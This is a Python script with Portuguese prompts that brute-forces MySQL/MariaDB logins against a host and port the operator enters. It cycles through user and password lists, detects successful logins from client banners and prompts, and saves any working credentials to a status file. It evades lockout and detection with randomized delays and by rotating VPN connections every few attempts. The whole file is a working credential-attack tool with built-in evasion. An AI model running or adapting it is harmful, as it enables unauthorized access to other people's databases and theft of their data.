import pexpect
import random
import passwords
import time
import vpn_vibe_coded
import users
from pathlib import Path

passwordsl = passwords.load_passwords()
usersl = users.load_users()
STATUS_FILE = Path(__file__).resolve().parent / "status.txt"

vpn_vibe_coded.prepare_vpn_configs()
openvpn_enter = vpn_vibe_coded.openvpn_enter_()

finded = False

LOGIN_SUCCESS_MARIADB = 0
LOGIN_SUCCESS_MYSQL = 1
LOGIN_SUCCESS_MARIADB_PT = 2
LOGIN_SUCCESS_MYSQL_PT = 3
LOGIN_SUCCESS_PROMPT = 4
ERROR_1698 = 5
ERROR_1045 = 6
END = 7
TIMEOUT = 8
MYSQL_TIMEOUT = 15


def reconnect_vpn(current_connection=None):
    if current_connection is not None and current_connection.isalive():
        current_connection.close(force=True)
    return vpn_vibe_coded.openvpn_enter_()


def update_status(line_number, value):
    with STATUS_FILE.open("r", encoding="utf-8") as f:
        lines = f.readlines()
    while len(lines) <= line_number:
        lines.append("\n")
    lines[line_number] = f"{value}\n"
    temporary_file = STATUS_FILE.with_suffix(".tmp")
    with temporary_file.open("w", encoding="utf-8") as f:
        f.writelines(lines)
    temporary_file.replace(STATUS_FILE)


def expect_state(process, patterns):
    try:
        return process.expect(patterns)
    except pexpect.EOF:
        return END
    except pexpect.TIMEOUT:
        return TIMEOUT


i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

host = input("Qual o destino: ")
port = input("Qual a porta (padrão: 3306): ")
update_status(7, host)

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):

    update_status(1, i)

    while j < len(passwordsl):

        update_status(2, j)

        process = pexpect.spawn(
            "mysql",
            ["-u", usersl[i], "-p", "-h", host, "-P", port],
            encoding="utf-8",
            timeout=MYSQL_TIMEOUT,
        )

        result = expect_state(
            process,
            [r"(?i)(?:Enter password|Digite a senha):"],
        )

        if result == 0:
            try:
                process.sendline(str(passwordsl[j]))
            except pexpect.EOF:
                result = END
            except pexpect.TIMEOUT:
                result = TIMEOUT

        if result == 0:
            result = expect_state(process, [
                r"Welcome to the MariaDB monitor",
                r"Welcome to the MySQL monitor",
                r"Bem-vindo ao monitor do MariaDB",
                r"Bem-vindo ao monitor do MySQL",
                r"(?m)^(?:mysql|MariaDB(?:\s+\[[^\r\n]*\])?)>\s*",
                r"ERROR 1698",
                r"ERROR 1045",
                pexpect.EOF,
                pexpect.TIMEOUT,
            ])

        if result in (
            LOGIN_SUCCESS_MARIADB,
            LOGIN_SUCCESS_MYSQL,
            LOGIN_SUCCESS_MARIADB_PT,
            LOGIN_SUCCESS_MYSQL_PT,
            LOGIN_SUCCESS_PROMPT,
        ):
            user1 = usersl[i]
            password = passwordsl[j]

            print(user1)
            print(password)

            process.close()

            finded = True

            update_status(3, "True")
            update_status(5, user1)
            update_status(6, password)

            break

        if result in (ERROR_1698, ERROR_1045):
            print("Senha recusada pelo MySQL.")
        elif result == END:
            print("A conexão com o MySQL foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite aguardando a resposta do MySQL.")

        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 10)
        time.sleep(delay)

        if result == TIMEOUT:
            tries_exceeded += 1

            if tries_exceeded >= 10:
                print("Muitas tentativas falhadas. Trocando de VPN...")
                update_status(4, "Trocando de VPN...")

                process.close()
                openvpn_enter = reconnect_vpn(openvpn_enter)

                update_status(4, "VPN trocada")

            else:
                process.close()
                continue

        tries_exceeded = 0
        process.close()
        
        if j >= next5:
            openvpn_enter = reconnect_vpn(openvpn_enter)
            next5 += 5
        
        if result != TIMEOUT:
            j += 1
            
    if finded == True:
        break

    i += 1
    j = 0

    next5 = 5

if not finded and tries_exceeded < 10:
    update_status(4, "Nenhuma combinação encontrada")

if openvpn_enter.isalive():
    openvpn_enter.close(force=True)